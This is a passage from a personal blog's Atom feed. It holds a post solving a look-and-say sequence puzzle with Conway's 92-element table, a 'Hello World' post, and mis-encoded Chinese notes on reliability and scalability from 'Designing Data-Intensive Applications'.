      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="æ€»ç»“" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>One problem at Haidian Book City</title>
    <link href="https://qiwihui.com/qiwihui-blog-2/"/>
    <id>https://qiwihui.com/qiwihui-blog-2/</id>
    <published>2018-10-09T05:07:20.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>Today, I just came by Haidian Book City as usual at Haidian dist inBeijing. and I found the problem hung on the wall nearby. It is veryinteresting and I want to share it.</p><span id="more"></span><h2><span id="0x00-problem"><strong>0x00 Problem</strong></span></h2><p>Here is one picture of it.</p><p><img src="https://user-images.githubusercontent.com/3297411/45277447-6ab6f900-b4fa-11e8-8201-8f9482f9e775.jpg" alt="27-problem_at_haidian_book_city"></p><p>A translation of that:</p><blockquote><p><em>Solve this problem, then itâ€™s your domain:</em><em>{3, 13, 1113, 3113,â€¦, the 8<sup>th</sup> number}.angelcrunch.com</em><br><em>(the QR code leads to the below link)</em><em><a href="http://www.angelcrunch.com/jiemi">www.angelcrunch.com/jiemi</a></em></p></blockquote><p>Once you finish it, you will get the second as below:</p><blockquote><p><em>Guess a television series by the following numbers, and you will get an interview.</em><em>3113112211322112 / 311311</em></p></blockquote><h2><span id="0x01-solution"><strong>0x01 Solution</strong></span></h2><p>Yes, as you may guess, it is one look-and-say sequence(sequence <a href="http://oeis.org/A006715">A006715</a> in<a href="http://en.wikipedia.org/wiki/On-Line_Encyclopedia_of_Integer_Sequences">OEIS</a>.</p><p>In the sewuence, each member is genrated from the previous menber by&quot;reading&quot; off the digits in it, counting rhe number of digits in groups ofthe same digit. For example:</p><ul><li>3 is reading off as â€œone 3â€ or 13.</li><li>13 is reading off as â€œone 1 one 3â€ or 1113.</li><li>1113 is reading off as â€œthree 1s, then one 3â€ or 3113.</li><li>and so on.</li></ul><p>If we start with any digit <em>d</em> from 0 to 9 then <em>d</em> will remainindefinitely as the last digit of the sequence. For <em>d</em> different from 1, thesequence starts as follows:</p><p><em>d, 1d, 111d, 311d, 13211d, 111312211d, 31131122211d, â€¦</em></p><p>As example in the following table.</p><p>    <table style="margin-right: auto; white-space: nowrap; width: auto;">      <tr style="Text">        <td align="left"><b><i>d</i></b></td>        <td align="left"><b>Sloane</b></td>        <td align="left"><b>sequence</b></td>      </tr>      <tr style="Text">        <td align="left">1</td>        <td align="left"><a href="http://oeis.org/A005150">A005150</a></td>        <td align="left">1, 11, 21, 1211, 111221, 312211, 13112221, 1113213211, ...</td>      </tr>      <tr style="Text">        <td align="left">2</td>        <td align="left"><a href="http://oeis.org/A006751">A006751</a></td>        <td align="left">2, 12, 1112, 3112, 132112, 1113122112, 311311222112, ...</td>      </tr>      <tr style="Text">        <td align="left">3</td>        <td align="left"><a href="http://oeis.org/A006715">A006715</a></td>        <td align="left">3, 13, 1113, 3113, 132113, 1113122113, 311311222113, ...</td>      </tr>    </table></p><p>Here, <em>d</em> equals 3.</p><p>So the first answer is 13211321322113.</p><p>For the second one, you need to know more about the sequence.John Conway studied this sequence and found that the 8<sup>th</sup>member and every member after it in the sequence is made up of one or moreof 92 â€œbasicâ€ non-interacting subsequences. The 92 basic subsequence showsin the following table(from <a href="http://www.pdmi.ras.ru/~lowdimma/topics_nth/conway_blocks.pdf">here</a>.</p><p>The fouth column in the table says what othersubsequences the given subsequence evolves into. He also show that thenumber of the digits in each member of the sequence grows a constant fromone member to the next. If L<ins>n</ins> is the number of the digits in then<sup>th</sup> member in the sequence, then L<ins>n+1</ins>/L<ins>n</ins> toa limitation when n to infinity. It is 1.303577269â€¦ , which we call itas <strong>Conway Constant</strong>.</p><p>  <table style="margin-right: auto; white-space: nowrap; width: auto;">      <tbody>        <tr>          <th>No.</th>          <th>Subsequence</th>          <th>Length</th>          <th>Evolves Into</th>        </tr>        <tr>          <td><strong>1</strong></td>          <td>1112</td>          <td>4</td>          <td>(63)</td>        </tr>        <tr>          <td><strong>2</strong></td>          <td>1112133</td>          <td>7</td>          <td>(64)(62)</td>        </tr>        <tr>          <td><strong>3</strong></td>          <td>111213322112</td>          <td>12</td>          <td>(65)</td>        </tr>        <tr>          <td><strong>4</strong></td>          <td>111213322113</td>          <td>12</td>          <td>(66)</td>        </tr>        <tr>          <td><strong>5</strong></td>          <td>1113</td>          <td>4</td>          <td>(68)</td>        </tr>        <tr>          <td><strong>6</strong></td>          <td>11131</td>          <td>5</td>          <td>(69)</td>        </tr>        <tr>          <td><strong>7</strong></td>          <td>111311222112</td>          <td>12</td>          <td>(84)(55)</td>        </tr>        <tr>          <td><strong>8</strong></td>          <td>111312</td>          <td>6</td>          <td>(70)</td>        </tr>        <tr>          <td><strong>9</strong></td>          <td>11131221</td>          <td>8</td>          <td>(71)</td>        </tr>        <tr>          <td><strong>10</strong></td>          <td>1113122112</td>          <td>10</td>          <td>(76)</td>        </tr>        <tr>          <td><strong>11</strong></td>          <td>1113122113</td>          <td>10</td>          <td>(77)</td>        </tr>        <tr>          <td><strong>12</strong></td>          <td>11131221131112</td>          <td>14</td>          <td>(82)</td>        </tr>        <tr>          <td><strong>13</strong></td>          <td>111312211312</td>          <td>12</td>          <td>(78)</td>        </tr>        <tr>          <td><strong>14</strong></td>          <td>11131221131211</td>          <td>14</td>          <td>(79)</td>        </tr>        <tr>          <td><strong>15</strong></td>          <td>111312211312113211</td>          <td>18</td>          <td>(80)</td>        </tr>        <tr>          <td><strong>16</strong></td>          <td>111312211312113221133211322112211213322112</td>          <td>42</td>          <td>(81)(29)(91)</td>        </tr>        <tr>          <td><strong>17</strong></td>          <td>111312211312113221133211322112211213322113</td>          <td>42</td>          <td>(81)(29)(90)</td>        </tr>        <tr>          <td><strong>18</strong></td>          <td>11131221131211322113322112</td>          <td>26</td>          <td>(81)(30)</td>        </tr>        <tr>          <td><strong>19</strong></td>          <td>11131221133112</td>          <td>14</td>          <td>(75)(29)(92)</td>        </tr>        <tr>          <td><strong>20</strong></td>          <td>1113122113322113111221131221</td>          <td>28</td>          <td>(75)(32)</td>        </tr>        <tr>          <td><strong>21</strong></td>          <td>11131221222112</td>          <td>14</td>          <td>(72)</td>        </tr>        <tr>          <td><strong>22</strong></td>          <td>111312212221121123222112</td>          <td>24</td>          <td>(73)</td>        </tr>        <tr>          <td><strong>23</strong></td>          <td>111312212221121123222113</td>          <td>24</td>          <td>(74)</td>        </tr>        <tr>          <td><strong>24</strong></td>          <td>11132</td>          <td>5</td>          <td>(83)</td>        </tr>        <tr>          <td><strong>25</strong></td>          <td>1113222</td>          <td>7</td>          <td>(86)</td>        </tr>        <tr>          <td><strong>26</strong></td>          <td>1113222112</td>          <td>10</td>          <td>(87)</td>        </tr>        <tr>          <td><strong>27</strong></td>          <td>1113222113</td>          <td>10</td>          <td>(88)</td>        </tr>        <tr>          <td><strong>28</strong></td>          <td>11133112</td>          <td>8</td>          <td>(89)(92)</td>        </tr>        <tr>          <td><strong>29</strong></td>          <td>12</td>          <td>2</td>          <td>(1)</td>        </tr>        <tr>          <td><strong>30</strong></td>          <td>123222112</td>          <td>9</td>          <td>(3)</td>        </tr>        <tr>          <td><strong>31</strong></td>          <td>123222113</td>          <td>9</td>          <td>(4)</td>        </tr>        <tr>          <td><strong>32</strong></td>          <td>12322211331222113112211</td>          <td>23</td>          <td>(2)(61)(29)(85)</td>        </tr>        <tr>          <td><strong>33</strong></td>          <td>13</td>          <td>2</td>          <td>(5)</td>        </tr>        <tr>          <td><strong>34</strong></td>          <td>131112</td>          <td>6</td>          <td>(28)</td>        </tr>        <tr>          <td><strong>35</strong></td>          <td>13112221133211322112211213322112</td>          <td>32</td>          <td>(24)(33)(61)(29)(91)</td>        </tr>        <tr>          <td><strong>36</strong></td>          <td>13112221133211322112211213322113</td>          <td>32</td>          <td>(24)(33)(61)(29)(90)</td>        </tr>        <tr>          <td><strong>37</strong></td>          <td>13122112</td>          <td>8</td>          <td>(7)</td>        </tr>        <tr>          <td><strong>38</strong></td>          <td>132</td>          <td>3</td>          <td>(8)</td>        </tr>        <tr>          <td><strong>39</strong></td>          <td>13211</td>          <td>5</td>          <td>(9)</td>        </tr>        <tr>          <td><strong>40</strong></td>          <td>132112</td>          <td>6</td>          <td>(10)</td>        </tr>        <tr>          <td><strong>41</strong></td>          <td>1321122112</td>          <td>10</td>          <td>(21)</td>        </tr>        <tr>          <td><strong>42</strong></td>          <td>132112211213322112</td>          <td>18</td>          <td>(22)</td>        </tr>        <tr>          <td><strong>43</strong></td>          <td>132112211213322113</td>          <td>18</td>          <td>(23)</td>        </tr>        <tr>          <td><strong>44</strong></td>          <td>132113</td>          <td>6</td>          <td>(11)</td>        </tr>        <tr>          <td><strong>45</strong></td>          <td>1321131112</td>          <td>10</td>          <td>(19)</td>        </tr>        <tr>          <td><strong>46</strong></td>          <td>13211312</td>          <td>8</td>          <td>(12)</td>        </tr>        <tr>          <td><strong>47</strong></td>          <td>1321132</td>          <td>7</td>          <td>(13)</td>        </tr>        <tr>          <td><strong>48</strong></td>          <td>13211321</td>          <td>8</td>          <td>(14)</td>        </tr>        <tr>          <td><strong>49</strong></td>          <td>132113212221</td>          <td>12</td>          <td>(15)</td>        </tr>        <tr>          <td><strong>50</strong></td>          <td>13211321222113222112</td>          <td>20</td>          <td>(18)</td>        </tr>        <tr>          <td><strong>51</strong></td>          <td>1321132122211322212221121123222112</td>          <td>34</td>          <td>(16)</td>        </tr>        <tr>          <td><strong>52</strong></td>          <td>1321132122211322212221121123222113</td>          <td>34</td>          <td>(17)</td>        </tr>        <tr>          <td><strong>53</strong></td>          <td>13211322211312113211</td>          <td>20</td>          <td>(20)</td>        </tr>        <tr>          <td><strong>54</strong></td>          <td>1321133112</td>          <td>10</td>          <td>(6)(61)(29)(92)</td>        </tr>        <tr>          <td><strong>55</strong></td>          <td>1322112</td>          <td>7</td>          <td>(26)</td>        </tr>        <tr>          <td><strong>56</strong></td>          <td>1322113</td>          <td>7</td>          <td>(27)</td>        </tr>        <tr>          <td><strong>57</strong></td>          <td>13221133112</td>          <td>11</td>          <td>(25)(29)(92)</td>        </tr>        <tr>          <td><strong>58</strong></td>          <td>1322113312211</td>          <td>13</td>          <td>(25)(29)(67)</td>        </tr>        <tr>          <td><strong>59</strong></td>          <td>132211331222113112211</td>          <td>21</td>          <td>(25)(29)(85)</td>        </tr>        <tr>          <td><strong>60</strong></td>          <td>13221133122211332</td>          <td>17</td>          <td>(25)(29)(68)(61)(29)(89)</td>        </tr>        <tr>          <td><strong>61</strong></td>          <td>22</td>          <td>2</td>          <td>(61)</td>        </tr>        <tr>          <td><strong>62</strong></td>          <td>3</td>          <td>1</td>          <td>(33)</td>        </tr>        <tr>          <td><strong>63</strong></td>          <td>3112</td>          <td>4</td>          <td>(40)</td>        </tr>        <tr>          <td><strong>64</strong></td>          <td>3112112</td>          <td>7</td>          <td>(41)</td>        </tr>        <tr>          <td><strong>65</strong></td>          <td>31121123222112</td>          <td>14</td>          <td>(42)</td>        </tr>        <tr>          <td><strong>66</strong></td>          <td>31121123222113</td>          <td>14</td>          <td>(43)</td>        </tr>        <tr>          <td><strong>67</strong></td>          <td>3112221</td>          <td>7</td>          <td>(38)(39)</td>        </tr>        <tr>          <td><strong>68</strong></td>          <td>3113</td>          <td>4</td>          <td>(44)</td>        </tr>        <tr>          <td><strong>69</strong></td>          <td>311311</td>          <td>6</td>          <td>(48)</td>        </tr>        <tr>          <td><strong>70</strong></td>          <td>31131112</td>          <td>8</td>          <td>(54)</td>        </tr>        <tr>          <td><strong>71</strong></td>          <td>3113112211</td>          <td>10</td>          <td>(49)</td>        </tr>        <tr>          <td><strong>72</strong></td>          <td>3113112211322112</td>          <td>16</td>          <td>(50)</td>        </tr>        <tr>          <td><strong>73</strong></td>          <td>3113112211322112211213322112</td>          <td>28</td>          <td>(51)</td>        </tr>        <tr>          <td><strong>74</strong></td>          <td>3113112211322112211213322113</td>          <td>28</td>          <td>(52)</td>        </tr>        <tr>          <td><strong>75</strong></td>          <td>311311222</td>          <td>9</td>          <td>(47)(38)</td>        </tr>        <tr>          <td><strong>76</strong></td>          <td>311311222112</td>          <td>12</td>          <td>(47)(55)</td>        </tr>        <tr>          <td><strong>77</strong></td>          <td>311311222113</td>          <td>12</td>          <td>(47)(56)</td>        </tr>        <tr>          <td><strong>78</strong></td>          <td>3113112221131112</td>          <td>16</td>          <td>(47)(57)</td>        </tr>        <tr>          <td><strong>79</strong></td>          <td>311311222113111221</td>          <td>18</td>          <td>(47)(58)</td>        </tr>        <tr>          <td><strong>80</strong></td>          <td>311311222113111221131221</td>          <td>24</td>          <td>(47)(59)</td>        </tr>        <tr>          <td><strong>81</strong></td>          <td>31131122211311122113222</td>          <td>23</td>          <td>(47)(60)</td>        </tr>        <tr>          <td><strong>82</strong></td>          <td>3113112221133112</td>          <td>16</td>          <td>(47)(33)(61)(29)(92)</td>        </tr>        <tr>          <td><strong>83</strong></td>          <td>311312</td>          <td>6</td>          <td>(45)</td>        </tr>        <tr>          <td><strong>84</strong></td>          <td>31132</td>          <td>5</td>          <td>(46)</td>        </tr>        <tr>          <td><strong>85</strong></td>          <td>311322113212221</td>          <td>15</td>          <td>(53)</td>        </tr>        <tr>          <td><strong>86</strong></td>          <td>311332</td>          <td>6</td>          <td>(38)(29)(89)</td>        </tr>        <tr>          <td><strong>87</strong></td>          <td>3113322112</td>          <td>10</td>          <td>(38)(30)</td>        </tr>        <tr>          <td><strong>88</strong></td>          <td>3113322113</td>          <td>10</td>          <td>(38)(31)</td>        </tr>        <tr>          <td><strong>89</strong></td>          <td>312</td>          <td>3</td>          <td>(34)</td>        </tr>        <tr>          <td><strong>90</strong></td>          <td>312211322212221121123222113</td>          <td>27</td>          <td>(36)</td>        </tr>        <tr>          <td><strong>91</strong></td>          <td>312211322212221121123222122</td>          <td>27</td>          <td>(35)</td>        </tr>        <tr>          <td><strong>92</strong></td>          <td>32112</td>          <td>5</td>          <td>(37)</td>        </tr>      </tbody>    </table></p><p>Those 92 subsequence is so basic that is constructs every member in the look-and-saysequence. Just like 92 elements. <a href="http://mathworld.wolfram.com/CosmologicalTheorem.html">Here</a>gives the periodic table of atoms associated with the look-and-say sequenceas named by Conway(1987). As we can see, 3113112211322112 links to <strong>Br</strong>, and311311 links to <strong>Ba</strong>.</p><p><strong>Br</strong>eaking <strong>Ba</strong>d. That is the answer.</p><h2><span id="0x02-more"><strong>0x02 More</strong></span></h2><p>That is perfect from the begining to the end. Many thanks to the problemmaker, and the screenwriters, also everyexcellent actors in Breaking Bad.</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      One problem at Haidian Book City
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>Hello World!</title>
    <link href="https://qiwihui.com/qiwihui-blog-1/"/>
    <id>https://qiwihui.com/qiwihui-blog-1/</id>
    <published>2018-10-09T04:44:19.000Z</published>
    <updated>2024-05-15T02:25:31.472Z</updated>
    
    <content type="html"><![CDATA[<p>Hello from qiwihui.</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Hello World!
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>ç¬¬ä¸€ç« ï¼šå¯é æ€§ï¼Œå¯æ‰©å±•æ€§ï¼Œå¯ç»´æŠ¤æ€§</title>
    <link href="https://qiwihui.com/ddia-1/"/>
    <id>https://qiwihui.com/ddia-1/</id>
    <published>2018-09-10T04:44:19.000Z</published>
    <updated>2022-08-13T01:54:25.630Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="di-yi-zhang-ke-kao-xing-ke-kuo-zhan-xing-ke-wei-hu-xing">ç¬¬ä¸€ç« ï¼šå¯é æ€§ï¼Œå¯æ‰©å±•æ€§ï¼Œå¯ç»´æŠ¤æ€§</span></h1><p>æ•°æ®å¯†é›†å‹ï¼ˆdata-intensiveï¼‰è€Œéè®¡ç®—å¯†é›†å‹ï¼ˆcompute-intensiveï¼‰ï¼š</p><ul><li>æ•°æ®é‡ã€æ•°æ®å¤æ‚æ€§ã€ä»¥åŠæ•°æ®çš„å˜æ›´é€Ÿåº¦</li><li>æ•°æ®å¯†é›†å‹åº”ç”¨åŸºæœ¬ç»„ä»¶<ul><li>å­˜å‚¨æ•°æ®ï¼Œä»¥ä¾¿è‡ªå·±æˆ–å…¶ä»–åº”ç”¨ç¨‹åºä¹‹åèƒ½å†æ¬¡æ‰¾åˆ° ï¼ˆ<strong><em>æ•°æ®åº“ï¼ˆdatabaseï¼‰</em></strong>ï¼‰</li><li>è®°ä½å¼€é”€æ˜‚è´µæ“ä½œçš„ç»“æœï¼ŒåŠ å¿«è¯»å–é€Ÿåº¦ï¼ˆ<strong><em>ç¼“å­˜ï¼ˆcacheï¼‰</em></strong>ï¼‰</li><li>å…è®¸ç”¨æˆ·æŒ‰å…³é”®å­—æœç´¢æ•°æ®ï¼Œæˆ–ä»¥å„ç§æ–¹å¼å¯¹æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼ˆ<strong><em>æœç´¢ç´¢å¼•ï¼ˆsearch indexesï¼‰</em></strong>ï¼‰</li><li>å‘å…¶ä»–è¿›ç¨‹å‘é€æ¶ˆæ¯ï¼Œè¿›è¡Œå¼‚æ­¥å¤„ç†ï¼ˆ<strong><em>æµå¤„ç†ï¼ˆstream processingï¼‰</em></strong>ï¼‰</li><li>å®šæœŸå¤„ç†ç´¯ç§¯çš„å¤§æ‰¹é‡æ•°æ®ï¼ˆ<strong><em>æ‰¹å¤„ç†ï¼ˆbatch processingï¼‰</em></strong>ï¼‰</li></ul></li><li>ä¸€ä¸ªå¯èƒ½çš„ç»„åˆä½¿ç”¨å¤šä¸ªç»„ä»¶çš„æ•°æ®ç³»ç»Ÿæ¶æ„ï¼š</li></ul><p><img src="https://user-images.githubusercontent.com/3297411/125434927-f4ac7199-069a-4bd5-8ed8-b5748a1b97da.png" alt="Untitled"></p><p>å½±å“æ•°æ®ç³»ç»Ÿè®¾è®¡çš„å› ç´ å¾ˆå¤šï¼ŒåŒ…æ‹¬å‚ä¸äººå‘˜çš„æŠ€èƒ½å’Œç»éªŒã€å†å²é—ç•™é—®é¢˜ã€ç³»ç»Ÿè·¯å¾„ä¾èµ–ã€äº¤ä»˜æ—¶é™ã€å…¬å¸çš„é£é™©å®¹å¿åº¦ã€ç›‘ç®¡çº¦æŸç­‰ã€‚</p><p>é‡è¦çš„ä¸‰ä¸ªé—®é¢˜ï¼›</p><ul><li><p><strong><em>å¯é æ€§ï¼ˆReliabilityï¼‰</em></strong></p><p>ç³»ç»Ÿåœ¨<strong>å›°å¢ƒï¼ˆadversityï¼‰</strong>ï¼ˆç¡¬ä»¶æ•…éšœã€è½¯ä»¶æ•…éšœã€äººä¸ºé”™è¯¯ï¼‰ä¸­ä»å¯æ­£å¸¸å·¥ä½œï¼ˆæ­£ç¡®å®ŒæˆåŠŸèƒ½ï¼Œå¹¶èƒ½è¾¾åˆ°æœŸæœ›çš„æ€§èƒ½æ°´å‡†ï¼‰ã€‚</p></li><li><p><strong><em>å¯æ‰©å±•æ€§ï¼ˆScalabilityï¼‰</em></strong></p><p>æœ‰åˆç†çš„åŠæ³•åº”å¯¹ç³»ç»Ÿçš„å¢é•¿ï¼ˆæ•°æ®é‡ã€æµé‡ã€å¤æ‚æ€§ï¼‰ã€‚</p></li><li><p><strong><em>å¯ç»´æŠ¤æ€§ï¼ˆMaintainabilityï¼‰</em></strong></p><p>éšç€æ—¶é—´çš„æ¨ç§»ï¼Œè®¸å¤šæ–°çš„äººå‘˜å‚ä¸åˆ°ç³»ç»Ÿå¼€å‘å’Œè¿ç»´ï¼Œ ä»¥ç»´æŠ¤ç°æœ‰åŠŸèƒ½æˆ–é€‚é… æ–°åœºæ™¯ç­‰ï¼Œç³»ç»Ÿéƒ½åº”é«˜æ•ˆè¿è½¬ã€‚</p></li></ul><h2><span id="ke-kao-xing">å¯é æ€§</span></h2><p>æœŸæœ›:</p><ul><li>åº”ç”¨ç¨‹åºæ‰§è¡Œç”¨æˆ·æ‰€æœŸæœ›çš„åŠŸèƒ½ã€‚</li><li>å¯ä»¥å®¹å¿ç”¨æˆ·å‡ºç°é”™è¯¯æˆ–è€…ä¸æ­£ç¡®çš„è½¯ä»¶ä½¿ç”¨æ–¹æ€¯ ã€‚</li><li>æ€§èƒ½å¯ä»¥åº”å¯¹å…¸å‹åœº æ™¯ ã€ åˆ ç†è´Ÿè½½å‹åŠ›å’Œæ•°æ® é‡ã€‚</li><li>ç³»ç»Ÿå¯é˜²æ­¢ä»»ä½•æœªç»æˆæƒçš„è®¿é—®å’Œæ»¥ç”¨ã€‚</li></ul><p>æ•…éšœï¼ˆfaultï¼‰å’Œå¤±æ•ˆï¼ˆfailureï¼‰ï¼š</p><ul><li>æ•…éšœï¼šç³»ç»Ÿçš„ä¸€éƒ¨åˆ†çŠ¶æ€åç¦»å…¶æ ‡å‡†ï¼›</li><li>å¤±æ•ˆï¼šç³»ç»Ÿä½œä¸ºä¸€ä¸ªæ•´ä½“åœæ­¢å‘ç”¨æˆ·æä¾›æœåŠ¡ã€‚</li><li>ç”±äºå‡ºç°faultçš„å‡ ç‡ä¸å¯èƒ½ä¸º0ï¼Œå› æ­¤å€¾å‘äºè®¾è®¡fault-tolerantè€Œä¸æ˜¯fault-preventingçš„ç³»ç»Ÿã€‚</li></ul><h3><span id="ying-jian-gu-zhang">ç¡¬ä»¶æ•…éšœ</span></h3><ul><li>éšæœºçš„ã€ç›¸äº’ç‹¬ç«‹çš„</li><li>è®¡ç®—æœºç³»ç»Ÿä¸­çš„ç¡¬ç›˜ã€å†…å­˜ã€power gridç­‰é›¶ä»¶éƒ½å¯èƒ½å‡ºé—®é¢˜ï¼Œè¿™å¯ä»¥é€šè¿‡å¢åŠ å•ä¸ªç¡¬ä»¶çš„å†—ä½™åº¦ï¼ˆredundancyï¼‰æ¥å‡å°‘æ•´ä¸ªç³»ç»Ÿå®•æœºçš„æ¦‚ç‡ï¼›</li><li>éšç€æ•°æ®é‡å’Œåº”ç”¨è®¡ç®—éœ€æ±‚çš„å¢åŠ ï¼Œå¢åŠ è®¾å¤‡å†—ä½™ä¹Ÿæ— æ³•è§£å†³ï¼Œå°±éœ€è¦è€ƒè™‘å¦‚ä½•åœ¨æŸä¸ªæœºå™¨å®•æœºçš„æƒ…å†µä¸‹é€šè¿‡è½¯ä»¶è°ƒåº¦æ¥é˜²æ­¢æ•´ä¸ªæœåŠ¡å´©æºƒã€‚</li></ul><h3><span id="ruan-jian-gu-zhang">è½¯ä»¶æ•…éšœ</span></h3><ul><li>ç³»ç»Ÿæ€§é”™è¯¯çš„BUGéš¾ä»¥é¢„æ–™ï¼Œé€šå¸¸åœ¨å¼‚å¸¸æƒ…å†µè¢«è§¦å‘ï¼Œä¾‹å¦‚Linuxå†…æ ¸çš„æ¶¦ç§’BUGï¼›</li><li>æ²¡æœ‰å¿«é€Ÿè§£å†³åŠæ³•ï¼Œåªèƒ½åœ¨å®ç°æ—¶ï¼š<ul><li>è®¤çœŸæ£€æŸ¥ä¾èµ–çš„å‡è®¾æ¡ä»¶ä¸ç³»ç»Ÿä¹‹é—´äº¤äº’</li><li>è¿›è¡Œå…¨é¢çš„æµ‹è¯•</li><li>è¿›ç¨‹éš”ç¦»</li><li>å…è®¸è¿›ç¨‹å´©æ„¤å¹¶è‡ªåŠ¨é‡å¯</li><li>åå¤è¯„ä¼°</li><li>ç›‘æ§äº•åˆ†æç”Ÿäº§ç¯èŠ‚çš„è¡Œä¸ºè¡¨ç°</li></ul></li></ul><h3><span id="ren-wei-gu-zhang">äººä¸ºæ•…éšœ</span></h3><ul><li>äººç±»æ˜¯ä¸å¯é çš„ï¼Œæ“ä½œäººå‘˜çš„ä¸å½“æ“ä½œå ç³»ç»Ÿå´©æºƒçš„75%ï½90%</li><li>å¦‚ä½•é™ä½ï¼š<ul><li>ä»¥æœ€å°å‡ºé”™çš„æ–¹å¼æ¥è®¾è®¡ç³»ç»Ÿï¼›</li><li>æƒ³åŠä½åˆ†ç¦»æœ€å®¹æ˜“å‡ºé”™çš„åœ°æ–¹ã€å®¹æ˜“å¼•å‘æ•…éšœçš„æ¥å£ï¼Œæä¾›sandboxè®©ä»–ä»¬ç†Ÿæ‚‰ä½¿ç”¨æ–¹æ³•ï¼Œéšæ„çŠ¯é”™è€Œä¸ä¼šå½±å“ç”Ÿäº§ï¼›</li><li>å……åˆ†çš„æµ‹è¯•ï¼šunit/integration/manualï¼›</li><li>å½“å‡ºç°äººä¸ºå¤±è¯¯æ—¶ï¼Œæä¾›å¿«é€Ÿçš„æ¢å¤æœºåˆ¶ä»¥å°½é‡å‡å°‘æ•…éšœå½±å“ï¼›</li><li>è®¾ç½®è¯¦ç»†è€Œæ¸…æ™°çš„ç›‘æ§å­ç³»ç»Ÿï¼ŒåŒ…æ‹¬æ€§èƒ½æŒ‡æ ‡å’Œé”™è¯¯ç‡ï¼›</li><li>æ¨è¡Œç®¡ç†æµç¨‹äº•åŠ ä»¥åŸ¹è®­ã€‚</li></ul></li></ul><h2><span id="ke-kuo-zhan-xing"><strong><em>å¯æ‰©å±•æ€§</em></strong></span></h2><p>ç³»ç»Ÿä¸è§å¾—ä¸€ç›´å¯é ï¼Œæ¯”å¦‚è´Ÿè½½å¢åŠ ï¼Œç³»ç»Ÿéœ€è¦æŒç»­å˜åŒ–ã€‚</p><h3><span id="heng-liang-fu-zai-load">è¡¡é‡è´Ÿè½½ï¼ˆLoadï¼‰</span></h3><ul><li>æ ¹æ®ç³»ç»Ÿç‰¹æ€§ç®€æ´æè¿°ï¼Œä¾‹å¦‚æœåŠ¡å™¨çš„æ¯ç§’è¯·æ±‚å¤„ç†æ¬¡æ•°ï¼Œæ•°æ®åº“è¯»å†™æ¯”ä¾‹ï¼Œç”¨æˆ·æ•°é‡ï¼Œ ç¼“å­˜å‘½ä¸­ç‡</li><li>Twitterä¾‹å­<ul><li>éœ€æ±‚<ul><li>ç”¨æˆ·å‘æ¨(avg 4.6k RPSï¼Œmax 12k RPS)</li><li>æŸ¥çœ‹ä¸ªäººä¸»é¡µæ—¶é—´çº¿(300k RPS)</li></ul></li><li>æŒ‘æˆ˜ï¼šå¦‚ä½•å¿«é€Ÿä¸ºç”¨æˆ·æä¾›timelineã€‚<ol><li>ç›´æ¥ä»æ•°æ®åº“è¯»æŸ¥è¯¢ï¼Œæ¶‰åŠjoinï¼Œåœ¨è¯·æ±‚å¤šçš„æ—¶å€™æ•°æ®åº“æ— æ³•å¤„ç†ï¼›</li><li>è€ƒè™‘ä¸ºæ¯ä¸ªç”¨æˆ·ç»´æŠ¤æ—¶é—´çº¿çš„ç¼“å­˜ï¼Œåªæ˜¯å‘æ¨çš„æ—¶å€™å°±éœ€è¦æ›´æ–°å¯¹åº”ç”¨æˆ·çš„ç¼“å­˜ï¼›</li><li>æ··åˆï¼šç”±äºå‘æ¨çš„RPSè¿œå°äºæŸ¥è¯¢ï¼Œç¼“å­˜çš„æ–¹æ³•å¯¹è¯»æ›´æœ‰ä¼˜åŠ¿ï¼Œä½†æ˜¯å¯¹äºfollowerä¼—å¤šçš„å¤§å·ï¼Œå‘æ¨éœ€è¦å†™å…¥çš„ç¼“å­˜å¯èƒ½éå¸¸å¤šï¼Œå› æ­¤å¯ä»¥è€ƒè™‘é’ˆå¯¹è¿™ç§å¤§å·ç›´æ¥å†™å…¥æ•°æ®åº“ï¼Œåœ¨æ—¶é—´çº¿å•ç‹¬ä»æ•°æ®åº“è¯»å¤§å·çš„æ¨ã€‚</li></ol></li></ul></li></ul><h3><span id="heng-liang-xing-neng-performance">è¡¡é‡æ€§èƒ½ï¼ˆPerformanceï¼‰</span></h3><ul><li>ä¸¤ä¸ªé—®é¢˜ï¼š<ul><li>å¢åŠ è´Ÿè½½å‚æ•°å¹¶ä¿æŒç³»ç»Ÿèµ„æºï¼ˆCPUã€å†…å­˜ã€ç½‘ç»œå¸¦å®½ç­‰ï¼‰ä¸å˜æ—¶ï¼Œç³»ç»Ÿæ€§èƒ½å°†å—åˆ°ä»€ä¹ˆå½±å“ï¼Ÿ</li><li>å¢åŠ è´Ÿè½½å‚æ•°å¹¶å¸Œæœ›ä¿æŒæ€§èƒ½ä¸å˜æ—¶ï¼Œéœ€è¦å¢åŠ å¤šå°‘ç³»ç»Ÿèµ„æºï¼Ÿ</li></ul></li><li>ååé‡ï¼ˆthroughputï¼‰ï¼šæ¯ç§’å¯ä»¥å¤„ç†çš„è®°å½•æ•°é‡ï¼Œæˆ–è€…åœ¨ç‰¹å®šè§„æ¨¡æ•°æ®é›†ä¸Šè¿è¡Œä½œä¸šçš„æ€»æ—¶é—´ï¼›</li><li>å“åº”æ—¶é—´ï¼ˆresponse timeï¼‰å’Œå»¶è¿Ÿï¼ˆlatencyï¼‰<ul><li>å“åº”æ—¶é—´ï¼šç½‘ç»œå»¶è¿Ÿ + queuing + service 